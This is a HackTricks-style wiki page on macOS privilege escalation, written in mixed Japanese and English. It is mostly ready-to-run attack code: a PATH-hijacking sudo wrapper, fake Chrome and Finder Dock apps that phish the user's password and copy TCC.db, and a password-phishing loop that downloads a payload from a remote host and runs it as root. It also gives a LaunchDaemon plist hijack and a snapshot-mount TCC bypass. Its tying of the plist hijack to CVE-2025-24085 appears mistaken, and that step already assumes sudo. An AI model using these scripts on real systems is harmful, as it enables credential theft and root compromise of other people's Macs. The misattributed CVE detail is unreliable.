# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

TCC privilege escalation を探してここに来た場合は、次を参照してください：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

ご注意：**most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines。したがって、次を参照してください：


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## ユーザーインタラクション

### Sudo Hijacking

オリジナルは[Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking)で確認できます。

しかし、macOS はユーザーが **`sudo`** を実行したときにユーザーの **`PATH`** を **保持します**。つまり、この攻撃を成功させる別の方法は、被害者が **running sudo** 時に実行するバイナリを **hijack other binaries** することです：
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ターミナルを使用するユーザーは高い確率で **Homebrew がインストールされています**。そのため、**`/opt/homebrew/bin`** のバイナリをハイジャックすることが可能です。

### Dock Impersonation

いくつかの **social engineering** を用いて、Dock 内で例えば **impersonate for example Google Chrome** を装い、実際に自分のスクリプトを実行させることができます:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
いくつかの提案：

- Dock に Chrome があるか確認し、ある場合はそのエントリを**削除**し、Dock 配列の同じ位置に**偽の** **Chrome エントリを追加**します。

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
いくつかの提案：

- **Finder を Dock から削除できません**。なので Dock に追加する場合は、偽の Finder を本物の隣に置くと良いです。これには **Dock 配列の先頭に偽の Finder エントリを追加する**必要があります。
- 別の選択肢として、Dock に配置せずに単に開くだけにする方法もあります。「Finder が Finder を制御しようとしています」と表示されてもそれほど不自然ではありません。
- 醜いダイアログでパスワードを尋ねることなく、**escalate to root without asking** する別の方法は、Finder に実際に権限が必要な操作を行わせてパスワードを尋ねさせることです：
- Finder に **`/etc/pam.d`** に新しい **`sudo`** ファイルをコピーさせる（パスワードを要求するプロンプトには "Finder wants to copy sudo" と表示されます）
- Finder に新しい **Authorization Plugin** をコピーさせる（ファイル名を制御できれば、パスワード要求のプロンプトに "Finder wants to copy Finder.bundle" と表示されます）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

マルウェアは頻繁にユーザーの操作を悪用して **sudo対応のパスワードを取得** し、プログラム的に再利用します。一般的なフロー:

1. `whoami` でログイン中のユーザを特定する。
2. **パスワードプロンプトをループ** し、`dscl . -authonly "$user" "$pw"` が成功するまで繰り返す。
3. 資格情報をキャッシュする（例: `/tmp/.pass`）し、`sudo -S`（password over stdin）で特権操作を実行する。

最小のチェーン例:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
盗まれたパスワードはその後再利用でき、**`xattr -c`でGatekeeperの隔離を解除したり**、LaunchDaemonsやその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりできます。

## Newer macOS-specific vectors (2023–2025)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia ではまだ動作します**。多くの商用アップデータは `/usr/libexec/security_authtrampoline` を信頼されていないパスで呼び出します。対象バイナリがユーザー書き込み可能であれば、trojanを植え付けて正当なプロンプトに便乗できます:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combine with the **masquerading tricks above** to present a believable password dialog.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

LaunchDaemon plist またはその `ProgramArguments` ターゲットが **user-writable** の場合、それを差し替えてから launchd に再読み込みを強制することで権限昇格できます:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
これは **CVE-2025-24085** に公開されたエクスプロイトパターンを反映しており、書き込み可能なplistが悪用されて攻撃者のコードがrootで実行された。

### XNU SMR credential race (CVE-2025-24118)

`kauth_cred_proc_update` 内のレースにより、ローカル攻撃者が読み取り専用の資格情報ポインタ（`proc_ro.p_ucred`）を破損させることができる。`setgid()`/`getgid()` のループをスレッド間で競合させ、不整合な `memcpy` が発生するまで続ける。破損に成功すると **uid 0** とカーネルメモリへのアクセスを得る。最小限のPoC構成:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
heap grooming と組み合わせて、pointer re-reads が発生する場所に制御されたデータを配置する。脆弱なビルドでは、これは SIP バイパスを必要としない信頼できる **local kernel privesc** です。

### SIP バイパス via Migration assistant ("Migraine", CVE-2023-32369)

既に root を取得している場合でも、SIP はシステム領域への書き込みをブロックします。**Migraine** バグは Migration Assistant の entitlement `com.apple.rootless.install.heritable` を濫用して、SIP バイパスを継承する子プロセスを生成し、保護されたパス（例: `/System/Library/LaunchDaemons`）を上書きします。チェーン:

1. ライブシステム上で root を取得する。
2. `systemmigrationd` を細工した状態でトリガーして、攻撃者制御のバイナリを実行させる。
3. 継承された entitlement を使って SIP 保護ファイルをパッチし、再起動後も永続化させる。

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

複数の Apple デーモンが XPC 経由で **NSPredicate** オブジェクトを受け取り、攻撃者が制御できる `expressionType` フィールドのみを検証します。任意の selector を評価するような predicate を構築することで、（例: `coreduetd`, `contextstored`）での **code execution in root/system XPC services** を達成できます。初期の app sandbox escape と組み合わせると、**privilege escalation without user prompts** を実現します。predicate をデシリアライズし、適切な visitor を持たない XPC エンドポイントを探してください。

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user**（非特権ユーザでも）は Time Machine スナップショットを作成・マウントして、そのスナップショット内のファイルを **access ALL the files** できます.\
必要な **only privileged** は、使用するアプリケーション（例: `Terminal`）が **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持っていることで、これは管理者によって付与される必要があります。

<details>
<summary>Time Machine スナップショットのマウント</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

より詳しい説明は[**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**。

## 機密情報

これは権限昇格に役立つ可能性があります:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## 参考

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
